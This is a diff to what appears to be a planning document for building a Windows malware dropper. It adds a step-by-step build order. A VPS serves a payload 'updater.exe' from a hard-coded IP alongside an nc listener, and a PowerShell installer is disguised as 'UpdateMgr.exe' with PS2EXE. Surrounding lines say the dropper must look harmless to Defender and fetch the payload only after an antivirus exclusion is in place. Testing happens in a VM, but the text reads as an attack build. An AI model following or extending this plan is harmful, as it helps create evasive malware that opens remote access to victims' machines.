@@ -41,6 +41,14 @@ Two files:
 
 The dropper must look boring to Defender — it only runs ordinary commands. The spicy payload downloads *after* the exclusion exists.
 
+## Build order
+
+1. **VPS:** clone repo, open firewall, start `http.server` + `nc` (Component 3).
+2. **Kali/WSL:** build `updater.exe`, commit + push to the payloads repo.
+3. **VPS:** `git pull` — payload is now served at `http://2.25.141.57/updater.exe`.
+4. **Windows machine:** write `install.ps1` (keep the source in the payloads repo too, so it's versioned), wrap with PS2EXE → `UpdateMgr.exe`. Copy the exe into the VM (shared folder / clipboard / drag-drop).
+5. **Windows VM:** run `UpdateMgr.exe`, follow the test plan.
+
 ## Component 1 — `updater.exe` (payload)
 
 Built on Kali/WSL:
